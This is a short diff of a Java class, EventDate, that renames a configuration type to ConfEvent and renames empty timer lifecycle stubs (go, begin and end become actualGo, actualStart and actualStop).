@@ -5,6 +5,7 @@ import java.text.ParseException;
 import java.util.Date;
 
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.util.Check;
 
@@ -15,7 +16,7 @@ public class EventDate extends BaseTimer {
 	private Date dateTo;
 
 	@Override
-	protected boolean parse(EventConf event) {
+	protected boolean parse(ConfEvent event) {
 		try {
 			String dateFromString=conf.getString("datefrom");
 			String dateToString=conf.getString("dateto");
@@ -35,19 +36,19 @@ public class EventDate extends BaseTimer {
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 		// TODO Auto-generated method stub
 
 	}
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		// TODO Auto-generated method stub
 
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		// TODO Auto-generated method stub
 
 	}
